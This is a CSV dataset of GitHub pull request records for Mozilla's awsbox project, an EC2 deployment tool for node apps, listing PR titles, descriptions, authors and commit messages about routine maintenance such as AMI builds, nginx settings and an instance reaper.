,pullid,pulls_number,pulltitle,pullsbody,pullsuserlogin,pullsuserid,pullauthordate,author_association,merged_status,stats_addns,stats_delns,stats_changed_files,pull_repo_desc,pull_repo_lang,pull_commit_sha,pull_commit_message
0,https://api.github.com/repos/mozilla/awsbox/pulls/149,149,Add Mozilla Code of Conduct,"Fixes #148

_(Message COC002)_",Mozilla-GitHub-Standards,48073334,2019-03-28T03:54:26Z,CONTRIBUTOR,True,15,0,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,fb2cc0f221b5dacf036754f8fae017a6f44c8f1e,"Add Mozilla Code of Conduct file

Fixes #148.

_(Message COC002)_"
1,https://api.github.com/repos/mozilla/awsbox/pulls/147,147,use standalone ./lib/relative-date.js,"r? - @rfk 
",jrgm,758162,2016-03-23T22:25:04Z,CONTRIBUTOR,True,52,2,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,43b825d8d4a9e36f608c83adf3e1d624e6a0ef37,use standalone ./util/relative-date.js
2,https://api.github.com/repos/mozilla/awsbox/pulls/143,143,"Updating nice-route53, fixes error when no hosted zones are found",,itayadler,512336,2015-02-16T17:46:43Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2d82cb34b937dad90cc270d57fb3d2fa6cb4b704,"Updating nice-route53, fixes error when no hosted zones are found"
3,https://api.github.com/repos/mozilla/awsbox/pulls/139,139,Extra refined instructions for AMI creation,,chilts,3048,2014-06-20T04:12:19Z,CONTRIBUTOR,True,44,5,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,b277bc0d5bf5f489535308f9bcb8782bfabc47b4,Extra refined instructions for AMI creation
4,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,db642163312ed2f5aba40245ba0c2c7175dfb9bd,some small tweaks to docs on make_an_image
5,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,30f8f0475eaab17caf81ec9e12fdd5e1515165f7,need to make StrictModes modifiable by uncommentingd
6,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,bafa69d845fab677b1e8b3d9aa2ab83638ea19a4,"add emacs-nox, strace, locate"
7,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,49dc965d14b6d144645b279f6cd25abecc28cdda,"increase maxBuffer for yum install,update which can spew on a stale ami image"
8,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1d80315db9363179ba8d26ff8a78e2ef72707000,a couple of fixes needed in some cases
9,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,3484af09b2b2099342e5f358456a26b5bbd3ae9e,workaround a problem with permissions on ~ec2-user/.ssh/authorized_keys
10,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,0c1d07c2b133816b986a574506ecfc4bf6ec33d1,doc fix
11,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1a30723e065087bbd2a42f2981ee5cb1d7ce6573,copy up pristinify script to ~ec2-user
12,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,592b4b5829e95ce81cf253f9df56e26f74c3f022,new ami images
13,https://api.github.com/repos/mozilla/awsbox/pulls/138,138,Towards new ami and etc,"This needs some folks to try it out and reviewing before merging. /cc @chilts, @rfk, @dannycoates, @6a68, @callahad

Summary:
- builds new AMI images from scratch Amazon Linux 64 using @lloyd's cdist work
- minor doc fixes for cdist
- in building from scratch, a couple of things have changed that were addressed, notably the need for ssh.ensureSshAccessPerms to allow app@ to login again (note: changes to awsbox.js look large but are mostly indenting the existing pyramid :-) )
- fixes another place where deploys would abort on too much buffer data (49dc965)
",jrgm,758162,2014-06-11T06:55:01Z,CONTRIBUTOR,True,113,64,7,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,f8e2e4c2b33636a51ad6c7622f19aea2163ac096,nodejs -> v0.10.29
14,https://api.github.com/repos/mozilla/awsbox/pulls/137,137,update to node 0.10.28,"update to current latest nodejs 0.10.x (and since persona now requires nodejs >= 0.10.26, this is needed _now_ to get an awsbox built for persona). @chilts r?
",jrgm,758162,2014-06-04T02:05:27Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,00b1bdfa0bae2e2db2f50bf9f577296a6d876258,update to node 0.10.28
15,https://api.github.com/repos/mozilla/awsbox/pulls/136,136,Fix buffer limits on remote commands,"Fixes https://github.com/mozilla/awsbox/issues/133.
fxa-content-server awsbox deploy is blocked by this. Also 5MB of buffer ought to be enough for anybody.
",vladikoff,128755,2014-06-02T03:18:44Z,CONTRIBUTOR,True,5,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,40cfddd31172477bac128a183a2dd2ce80108508,Fix buffer limits on remote commands
16,https://api.github.com/repos/mozilla/awsbox/pulls/135,135,"set ""proxy_buffering off"" for GH-131 and GH-122","Fixes  GH-131 and GH-122
",jrgm,758162,2014-05-31T02:09:13Z,CONTRIBUTOR,True,2,0,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2ea14f575456691b3a8661cfd2bf607defaf27de,"set ""proxy_buffering off"" for GH-131 and GH-122"
17,https://api.github.com/repos/mozilla/awsbox/pulls/130,130,write out ver.txt after everything has completed ok,"Seems to work for me. (I don't believe there's any need to write it out temporarily; it should reflect what is successfully built (not what was attempted)).
",jrgm,758162,2014-03-17T05:36:16Z,CONTRIBUTOR,True,7,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,b6ef8560c9a08857b1a93db4688a105daa6ccdfe,write out ver.txt after everything has completed ok
18,https://api.github.com/repos/mozilla/awsbox/pulls/130,130,write out ver.txt after everything has completed ok,"Seems to work for me. (I don't believe there's any need to write it out temporarily; it should reflect what is successfully built (not what was attempted)).
",jrgm,758162,2014-03-17T05:36:16Z,CONTRIBUTOR,True,7,3,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,4d4fdde9a2a798949ac963f9cec99e79199954a7,order child_process.exec callback parameters correctly
19,https://api.github.com/repos/mozilla/awsbox/pulls/129,129,Standardise which environment variables we use,"The following tools all use AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY,
so let's use them too:
- aws-cli      : https://github.com/aws/aws-cli#getting-started
- aws-sdk-ruby : http://docs.aws.amazon.com/AWSRubySDK/latest/index.html#Basic_Configuration
- aws-sdk-js   : http://docs.aws.amazon.com/AWSJavaScriptSDK/guide/node-configuring.html#Credentials_from_Environment_Variables
",chilts,3048,2014-03-17T02:18:48Z,CONTRIBUTOR,True,72,37,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,f638a185d3b23500378cb061d43435eca9adca7e,"Standardise which environment variables we use

The following tools all use AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY,
so let's use them too:

* aws-cli      : https://github.com/aws/aws-cli#getting-started
* aws-sdk-ruby : http://docs.aws.amazon.com/AWSRubySDK/latest/index.html#Basic_Configuration
* aws-sdk-js   : http://docs.aws.amazon.com/AWSJavaScriptSDK/guide/node-configuring.html#Credentials_from_Environment_Variables"
20,https://api.github.com/repos/mozilla/awsbox/pulls/125,125,check if dispName is defined first,"I keep hitting this and dying when doing `awsbox list`. /cc @chilts
",jrgm,758162,2014-03-11T18:16:40Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,89c016ec4ac4b8ad5481d1c5ff178e7f9811ffce,check if dispName is defined first
21,https://api.github.com/repos/mozilla/awsbox/pulls/119,119,Support multi-level subdomains within a hosted zone.,"Fixes #118.  @chilts IIRC you did most of the r53 work here, r?
",rfk,34695,2014-02-12T02:36:20Z,MEMBER,True,22,11,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,5d08b3e3f6aab0a948bb5b4b4a8a0eacb8fdefd0,Support multi-level subdomains within a hosted zone.
22,https://api.github.com/repos/mozilla/awsbox/pulls/116,116,Fix documentation for nginx restart,,Standard8,520844,2014-01-24T08:56:15Z,MEMBER,True,2,2,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,b8afddcf21a17c91d9c31b9a8b37985b6b3073aa,Fix documentation for nginx restart
23,https://api.github.com/repos/mozilla/awsbox/pulls/115,115,Allow config.json to supply environment variables as well as via awsbox.json,"config.json is a machine/instance specific file. Using this, we could allow setting of environment variables applicable to the particular deployment.

This is in addition to the project specific env vars in awsbox.json.

This allows greater flexibility for configurations and allows for secrets to not be in the awsbox.json file which is typically checked into repositories.
",Standard8,520844,2013-11-19T11:08:55Z,MEMBER,True,37,21,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,f6dd483ea6e9355be4a76ddb0a3ea2195ec0312d,Allow config.json to supply environment variables as well
24,https://api.github.com/repos/mozilla/awsbox/pulls/111,111,Allow a redirect option for ssl configuration to handle ELBs terminating the https connection,"My current setup is for ELBs to terminate the https connection, but to still need http to redirect to https.

The easiest way I've found to handle this with awsbox is to copy the nginx proxy redirect for the http -> https but then remove the https config, and let the ELB connect to the server on port 10000 (the default port for the server).
",Standard8,520844,2013-10-07T19:42:25Z,MEMBER,True,24,4,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,c7ec0f3846e18943a93f8bbb0676fae32a55a667,Allow a redirect option for ssl configuration to handle ELBs terminating the https connection
25,https://api.github.com/repos/mozilla/awsbox/pulls/111,111,Allow a redirect option for ssl configuration to handle ELBs terminating the https connection,"My current setup is for ELBs to terminate the https connection, but to still need http to redirect to https.

The easiest way I've found to handle this with awsbox is to copy the nginx proxy redirect for the http -> https but then remove the https config, and let the ELB connect to the server on port 10000 (the default port for the server).
",Standard8,520844,2013-10-07T19:42:25Z,MEMBER,True,24,4,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,2e47e4d58b6a2149a207c374621082f46b9ee275,Improve redirects for ELB termination by handling everything on port 80.
26,https://api.github.com/repos/mozilla/awsbox/pulls/111,111,Allow a redirect option for ssl configuration to handle ELBs terminating the https connection,"My current setup is for ELBs to terminate the https connection, but to still need http to redirect to https.

The easiest way I've found to handle this with awsbox is to copy the nginx proxy redirect for the http -> https but then remove the https config, and let the ELB connect to the server on port 10000 (the default port for the server).
",Standard8,520844,2013-10-07T19:42:25Z,MEMBER,True,24,4,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,ef57f096f4c91eecf0c1e4a0b0d2efb9d7275cdf,Merge branch 'master' into ssl_proxy_fixes
27,https://api.github.com/repos/mozilla/awsbox/pulls/111,111,Allow a redirect option for ssl configuration to handle ELBs terminating the https connection,"My current setup is for ELBs to terminate the https connection, but to still need http to redirect to https.

The easiest way I've found to handle this with awsbox is to copy the nginx proxy redirect for the http -> https but then remove the https config, and let the ELB connect to the server on port 10000 (the default port for the server).
",Standard8,520844,2013-10-07T19:42:25Z,MEMBER,True,24,4,3,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,0585da9b462ac6ee5aaaf1bf146a3366d0e68654,Fix arguments for moving proxy config files
28,https://api.github.com/repos/mozilla/awsbox/pulls/109,109,ability to claim instances,"This pull requests adds features around claiming instances:
1. create command by default expects AWS_EMAIL to be defined
2. upon instance creation an 'email' tag will be added to the instance
3. `claim` lets you tag an instance with your email
4. `unclaimed` lets you list unclaimed instances.
",lloyd,39411,2013-09-25T09:02:37Z,CONTRIBUTOR,True,47,2,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,056ab4af93db9df186c1a48a2dd95093d89072b9,add features around claiming instances with email address to help large scale users of awsbox manage their instances better
29,https://api.github.com/repos/mozilla/awsbox/pulls/107,107,multi-region support - issue #21 - issue #105,,lloyd,39411,2013-09-20T09:16:30Z,CONTRIBUTOR,True,170,40,5,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,0334853f64ad8f2811becd36680af4a68f5f1cf1,multi-region support - issue #21 - issue #105
30,https://api.github.com/repos/mozilla/awsbox/pulls/106,106,Add a step to make sure user has an RSA SSH key.,"This is to fix https://github.com/mozilla/awsbox/issues/26 :-)
",vthunder,435972,2013-09-19T18:42:06Z,CONTRIBUTOR,True,8,6,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,5ab5f7231895616ed8337fb7dd5f8ad0717bb8c5,Add a step to make sure user has an RSA SSH key.
31,https://api.github.com/repos/mozilla/awsbox/pulls/103,103,Fix how to get the error when something goes wrong,,chilts,3048,2013-09-18T23:58:47Z,CONTRIBUTOR,False,2,2,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,6ad7c46f746be24bb270b2c209fc8ba3adcbc9fd,Fix how to get the error when something goes wrong
32,https://api.github.com/repos/mozilla/awsbox/pulls/99,99,Force version of nice-route53 to new 0.3.3,"There was a bug in nice-route53 about updating A records
  https://github.com/chilts/nice-route53/issues/1

@chilts pushed a new version to npmjs.org, but for reasons I don't get, `npm
install awsbox` is installing the previous `0.3.2` version.

So, this change forces the version to `0.3.3` (not `0.3.x`).
",jrgm,758162,2013-09-18T04:13:24Z,CONTRIBUTOR,False,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,1883beac107440f6cfbb8d1845c7ffc6b5194680,"There was a bug in nice-route53 about updating A records
  https://github.com/chilts/nice-route53/issues/1

@chilts pushed a new version to npmjs.org, but for reasons I don't get, `npm
install awsbox` is installing the previous `0.3.2` version.

So, this change forces the version to `0.3.3` (not `0.3.x`)."
33,https://api.github.com/repos/mozilla/awsbox/pulls/97,97,Use the err.msg rather than the err object,,chilts,3048,2013-09-18T02:27:33Z,CONTRIBUTOR,True,1,1,1,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,104135d68725f37d5a5676a904018543ebc32ed2,Use the err.msg rather than the err object
34,https://api.github.com/repos/mozilla/awsbox/pulls/96,96,addkey command takes a file or directory,"note, the command line documentation suggests that addkey works this way, however, we never actually implemented it.  I always forget to add keys at instance creation time, so maybe a nice little feature.  @chilts or @jedp - r?
",lloyd,39411,2013-09-17T12:02:11Z,CONTRIBUTOR,True,40,23,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,083b343df518bf1613fb3d7da2a3967e4a9e1f55,addkey command takes a file or directory
35,https://api.github.com/repos/mozilla/awsbox/pulls/96,96,addkey command takes a file or directory,"note, the command line documentation suggests that addkey works this way, however, we never actually implemented it.  I always forget to add keys at instance creation time, so maybe a nice little feature.  @chilts or @jedp - r?
",lloyd,39411,2013-09-17T12:02:11Z,CONTRIBUTOR,True,40,23,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,ac02cfa13dbf27f9685bcf25dc49a7e4cbb86cc6,fix exception for non-zero exit code in script
36,https://api.github.com/repos/mozilla/awsbox/pulls/96,96,addkey command takes a file or directory,"note, the command line documentation suggests that addkey works this way, however, we never actually implemented it.  I always forget to add keys at instance creation time, so maybe a nice little feature.  @chilts or @jedp - r?
",lloyd,39411,2013-09-17T12:02:11Z,CONTRIBUTOR,True,40,23,2,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,a5ec9f970561abe44776d063ae6a3f8bc3757ca2,move 'added' var decl closer to usage
37,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,a362381c09d4def5380b18b957978773e8adde43,#86 improve compatibility with EC2 CLI env. variables
38,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,05f7bfe331143cd3bb406be611b7925fe7930bbb,#86 now usage of other env. variables actually works
39,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,6b6833c858bfe46c9ea3581e069aa57935142dfe,#85 add command to find all EC2 instances tagged with AWSBOX
40,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,9922b6936c879007c2a278391da3449f44b9e6c4,Merge branch '#86-ec2-cli-parity' into #85-reaper
41,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,e6b0d083a52a453d9941388a9b2f4f61c6ddca31,#85 improve filtering of AWSBOX logic
42,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,73f2d490c8ed6726edc868d2ddfa44c7f99c0b1b,add logic stubs for the reaper
43,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,78ab5e92671054a858a026dd114fa96a6a808bd6,rework reaper to keep more state in EC2 tags
44,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,9157792f6ef653e26d607a0dd0f40774197854b2,add email templates
45,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
- `AWSBOX_NOKILL` ec2 tag is present. These will be always spared from the reaper. Should be used sparingly. 

The reaper will also sending warning messages. The first warning 48 hours before and the final warning 24 hours before. 

Also adds these awsbox commands: 
- `awsbox list-awsboxes` - prints a list of all EC2 instances tagged with `AWSBOX`
- `awsbox spareme <instanceid>` - adds the `AWSBOX_SPAREME` tag to the instance
- `awsbox nokill <instanceid>` - adds the `AWSBOX_NOKILL` tag to the instance
",mostlygeek,83972,2013-07-24T00:22:21Z,NONE,False,367,10,8,A featherweight PaaS on top of Amazon EC2 for deploying node apps,JavaScript,71e4e2097527c29ac32ffa00e311742fc357b48f,move reaper code into its own CLI tool
46,https://api.github.com/repos/mozilla/awsbox/pulls/88,88,Add in the reaper.js and new awsbox.js related functionality,"This adds the new CLI tool, `reaper.js` which is meant to be run as a cronjob every hour. Right now it has a fixed schedule of reaping boxes that are 1 week old unless: 
- `AWSBOX_SPAREME` ec2 tag is present. This will add an additional week of life to the AWSBOX. 
